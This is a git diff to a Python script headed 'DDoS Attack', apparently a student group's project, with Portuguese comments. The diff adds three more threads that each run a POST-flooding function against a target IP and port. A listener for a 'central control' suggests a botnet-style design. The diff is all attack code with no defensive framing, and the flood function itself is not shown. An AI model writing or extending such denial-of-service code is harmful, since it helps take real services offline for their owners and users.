@@ -1,5 +1,5 @@
 #DDoS Attack
-#Created by : Yuri Castro
+#Created by DDoS group from UnB
 
 #Bibliotecas
 from socket import *
@@ -35,8 +35,11 @@ def attack(IP, attackedServerPort):
     channel8 = Thread(target= Post, args= [IP, attackedServerPort])
     channel9 = Thread(target= Post, args= [IP, attackedServerPort])
     channel10 = Thread(target= Post, args= [IP, attackedServerPort])
+    channel11 = Thread(target= Post, args= [IP, attackedServerPort])
+    channel12 = Thread(target= Post, args= [IP, attackedServerPort])
+    channel13 = Thread(target= Post, args= [IP, attackedServerPort])
 
-    #seta as threads como daemon
+    #seta as threads como daemon = true para que elas possam ser destruidas
     channel1.setDaemon(True)
     channel2.setDaemon(True)
     channel3.setDaemon(True)
@@ -47,7 +50,11 @@ def attack(IP, attackedServerPort):
     channel8.setDaemon(True)
     channel9.setDaemon(True)
     channel10.setDaemon(True)
-    #Inicia as 5 threads
+    channel11.setDaemon(True)
+    channel12.setDaemon(True)
+    channel13.setDaemon(True)
+    
+    #Inicia as threads
     channel1.start()
     channel2.start()
     channel3.start()
@@ -58,6 +65,9 @@ def attack(IP, attackedServerPort):
     channel8.start()
     channel9.start()
     channel10.start()
+    channel11.start()
+    channel12.start()
+    channel13.start()
 
 #Funcao que escuta o controle central
 def listening():
